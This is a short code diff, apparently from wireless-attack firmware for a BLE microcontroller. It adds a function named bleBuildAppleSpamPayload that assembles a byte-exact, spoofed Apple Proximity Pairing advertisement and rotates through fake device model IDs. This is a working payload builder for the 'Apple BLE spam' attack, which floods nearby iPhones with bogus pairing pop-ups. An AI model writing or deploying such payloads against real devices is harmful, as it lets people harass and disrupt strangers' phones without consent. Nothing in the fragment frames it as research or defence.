@@ -162,3 +162,27 @@ BleWriteStatus bleWriteCharacteristic(const String& mac, uint8_t addr_type,
         }
     }
 
+    BLE.end();
+    return status;
+}
+
+size_t bleBuildAppleSpamPayload(uint8_t* out_buf, size_t cap, int rotation, uint8_t r0, uint8_t r1) {
+    if (!out_buf || cap < BLE_APPLE_PAYLOAD_LEN) return 0;
+    const int count = (int)(sizeof(kAppleModels) / sizeof(kAppleModels[0]));
+    const int idx = (rotation < 0 ? 0 : rotation) % count;
+
+    // Exact 30-byte Apple Proximity Pairing packet:
+    // AD1: len=2, type=0x01, flags=0x1A (3 bytes)
+    // AD2: len=0x1A (26 bytes), type=0xFF, data=25 bytes (27 bytes total) => 3 + 27 = 30 bytes
+    const uint8_t apple[BLE_APPLE_PAYLOAD_LEN] = {
+        0x02, 0x01, 0x1A,
+        0x1A, 0xFF, 0x4C, 0x00,
+        0x07, 0x19, 0x07,
+        kAppleModels[idx][0], kAppleModels[idx][1],
+        0xC0,
+        r0, r1,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    };
+    memcpy(out_buf, apple, sizeof(apple));
+    return sizeof(apple);
